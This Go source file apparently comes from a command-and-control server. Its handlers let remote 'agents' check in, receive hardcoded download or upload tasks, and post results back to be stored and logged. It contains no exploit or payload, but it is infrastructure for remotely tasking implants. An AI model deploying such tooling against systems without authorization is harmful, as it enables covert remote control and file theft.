package router

import (
	"encoding/json"
	"io"
	"log"
	"net/http"
	"numinon_shadow/internal/models"
	"numinon_shadow/internal/taskmanager"
)

// CheckinHandler processes requests from clients checking in for tasks
func CheckinHandler(w http.ResponseWriter, r *http.Request) {

	agentID := r.Header.Get("Agent-ID")
	log.Printf("|✅ CHK_IN| Received check-in %s from Agent ID: %s via %s", r.Method, agentID, r.RemoteAddr)

	var response models.ServerTaskResponse

	// TEMPORARY: For testing, always create a task
	// Later this will be driven by your UI/API
	response.TaskAvailable = true

	// Create command arguments (using your existing function)
	command := "download" // Hardcoded for now
	var commandArgs json.RawMessage

	switch command {
	case "download":
		commandArgs = returnDownloadStruct(w)
	case "upload":
		commandArgs = returnUploadStruct(w)
	default:
		// For commands without special args
		commandArgs = json.RawMessage("{}")
	}

	// Create task in task manager
	task, err := TaskManager.CreateTask(agentID, command, commandArgs)
	if err != nil {
		log.Printf("|❗ERR TASK| Failed to create task: %v", err)
		http.Error(w, "Failed to create task", http.StatusInternalServerError)
		return
	}

	// Use orchestrator to prepare the task (sets metadata, validates args, etc.)
	if err := Orchestrators.PrepareTask(task); err != nil {
		log.Printf("|❗ERR TASK| Failed to prepare task: %v", err)
		http.Error(w, "Failed to prepare task", http.StatusInternalServerError)
		return
	}

	// Update task with any metadata set by the orchestrator
	if err := TaskManager.UpdateTask(task); err != nil {
		log.Printf("|❗WARN TASK| Failed to update task after preparation: %v", err)
		// Continue anyway - task was created
	}

	// Populate response with task details
	response.TaskID = task.ID
	response.Command = task.Command
	response.Data = task.Arguments

	// Mark task as dispatched
	if err := TaskManager.MarkDispatched(task.ID); err != nil {
		log.Printf("|❗WARN TASK| Failed to mark task as dispatched: %v", err)
		// Continue anyway - task was created and sent
	}

	log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s",
		response.Command, response.TaskID, agentID)

	// Send response
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		log.Printf("|❗ERR RESPONSE| Failed to encode response: %v", err)
		http.Error(w, "Error creating response", http.StatusInternalServerError)
		return
	}
}

// ResultsHandler processes task results from agents
func ResultsHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.Header.Get("Agent-ID")
	log.Printf("|✅ RESULT| Received results POST from Agent ID: %s via %s", agentID, r.RemoteAddr)

	// Read the raw body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("|❗ERR RESULT| Error reading result body from agent %s: %v", agentID, err)
		http.Error(w, "Failed to read request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// Parse the result
	var result models.AgentTaskResult
	if err := json.Unmarshal(body, &result); err != nil {
		log.Printf("|❗ERR RESULT| Error unmarshaling result JSON from agent %s: %v", agentID, err)
		http.Error(w, "Invalid result format", http.StatusBadRequest)
		return
	}

	// Look up the task
	task, err := TaskManager.GetTask(result.TaskID)
	if err != nil {
		log.Printf("|❗ERR RESULT| Task not found: %s from agent %s", result.TaskID, agentID)
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}

	// Verify this result is from the expected agent
	if task.AgentID != agentID {
		log.Printf("|⚠️ SECURITY| Task %s result received from wrong agent. Expected: %s, Got: %s",
			result.TaskID, task.AgentID, agentID)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Store the raw result
	if err := TaskManager.StoreResult(task.ID, body); err != nil {
		log.Printf("|❗ERR RESULT| Failed to store result for task %s: %v", task.ID, err)
		http.Error(w, "Failed to process result", http.StatusInternalServerError)
		return
	}

	// Use orchestrator to process command-specific logic
	if err := Orchestrators.ProcessResult(task, body); err != nil {
		log.Printf("|❗ERR PROCESS| Command-specific processing failed for task %s: %v",
			task.ID, err)
		// Mark task as failed but still return success to agent
		TaskManager.MarkFailed(task.ID, err.Error())
	} else {
		// Update task with any metadata changes from processing
		TaskManager.UpdateTask(task)
	}

	// Pretty print for debugging
	prettyPrintResult(result, agentID)

	// Respond to agent
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Result received"))
}

// prettyPrintResult logs the result in a readable format
func prettyPrintResult(result models.AgentTaskResult, agentID string) {
	prettyResult := struct {
		TaskID string `json:"task_id"`
		Status string `json:"status"`
		Output any    `json:"output"`
		Error  string `json:"error"`
	}{
		TaskID: result.TaskID,
		Status: result.Status,
		Output: result.Output,
		Error:  result.Error,
	}

	if prettyJSON, err := json.MarshalIndent(prettyResult, "", "  "); err == nil {
		log.Printf("|✅ RESULT| Task completed by Agent %s\n--- Task Result ---\n%s\n-------------------",
			agentID, string(prettyJSON))
	}
}

// TaskStatsHandler provides task statistics (useful for debugging)
func TaskStatsHandler(w http.ResponseWriter, r *http.Request) {
	if store, ok := TaskManager.(*taskmanager.MemoryTaskStore); ok {
		stats := store.Stats()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(stats)
	} else {
		http.Error(w, "Stats not available", http.StatusNotImplemented)
	}
}
